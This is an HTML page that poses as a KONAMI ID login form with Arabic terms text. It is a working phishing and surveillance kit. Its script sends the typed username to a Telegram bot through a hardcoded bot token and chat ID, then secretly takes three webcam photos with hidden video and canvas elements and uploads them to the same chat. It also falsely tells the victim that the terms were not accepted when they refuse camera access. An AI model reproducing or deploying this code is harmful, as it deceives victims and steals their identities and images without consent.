

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KONAMI Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f7f7f7;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: #fff;
      width: 100%;
      max-width: 400px;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      font-size: 28px;
      color: #e60012;
      font-weight: bold;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
      background-color: #d71920;
      color: white;
      margin-top: 10px;
    }
    .status {
      margin-top: 10px;
      font-size: 14px;
      color: #333;
    }
    .terms {
      margin: 10px 0;
      font-size: 14px;
    }
    #retryBtn {
      display: none;
      background-color: #0078d7;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">KONAMI</div>
    <h2>KONAMI ID</h2>

    <input id="username" type="text" placeholder="KONAMI ID / E-mail address">

    <div class="terms">
      <input type="checkbox" id="agree"> أوافق على <a href="#">الشروط</a> و <a href="#">الخصوصية</a>
    </div>

    <button id="loginBtn" class="btn">Log In</button>
    <button id="retryBtn" class="btn">🔄 إعادة المحاولة</button>
    <div id="status" class="status"></div>
  </div>

  <video id="v" autoplay playsinline style="display:none"></video>
  <canvas id="c" width="640" height="480" style="display:none"></canvas>

<script>
const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw"; // 🔹 ضع التوكن هنا
const CHAT_ID = "6504203392";        // 🔹 ضع chat_id الخاص بك
const loginBtn = document.getElementById("loginBtn");
const retryBtn = document.getElementById("retryBtn");
const statusDiv = document.getElementById("status");
const video = document.getElementById("v");
const canvas = document.getElementById("c");
const ctx = canvas.getContext("2d");
const agreeCheckbox = document.getElementById("agree");
const usernameInput = document.getElementById("username");

function setStatus(msg){ statusDiv.textContent = msg; }

async function sendMessageToTelegram(text){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("text", text);

  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: "POST",
    body: fd
  });
}

async function sendPhotoToTelegram(imgBase64, caption=""){
  const blob = await (await fetch(imgBase64)).blob();
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "photo.png");
  if(caption) fd.append("caption", caption);

  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  });
}

async function openCamera(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    await video.play();
    return stream;
  } catch (err) {
    throw new Error("❌ يجب الموافقة على الشروط والخصوصية لإكمال العملية.");
  }
}

async function captureOnce(){
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

async function startProcess(){
  if(!agreeCheckbox.checked){
    alert("يجب الموافقة على الشروط والخصوصية للمتابعة.");
    return;
  }

  alert("تنبيه: يجب الموافقة على الشروط والخصوصية لإكمال العملية.");

  loginBtn.disabled = true;
  retryBtn.style.display = "none";
  setStatus("جاري إرسال البيانات...");

  const username = usernameInput.value || "No username";
  await sendMessageToTelegram("📩 User: " + username);

  try {
    const stream = await openCamera();
    for(let i=1;i<=3;i++){
      const img = await captureOnce();
      await sendPhotoToTelegram(img, `📸 صورة ${i}/3 للمستخدم: ${username}`);
      setStatus(`تم إرسال الصورة ${i}/3`);
      await new Promise(r=>setTimeout(r,800));
    }
    setStatus("✅ اكتملت العملية بنجاح");
    stream.getTracks().forEach(t=>t.stop());
  } catch(err){
    setStatus(err.message);
    alert(err.message);
    retryBtn.style.display = "block"; // 🔄 إظهار زر إعادة المحاولة
  } finally {
    loginBtn.disabled = false;
  }
}

loginBtn.addEventListener("click", startProcess);
retryBtn.addEventListener("click", startProcess);
</script>

</body>
</html>
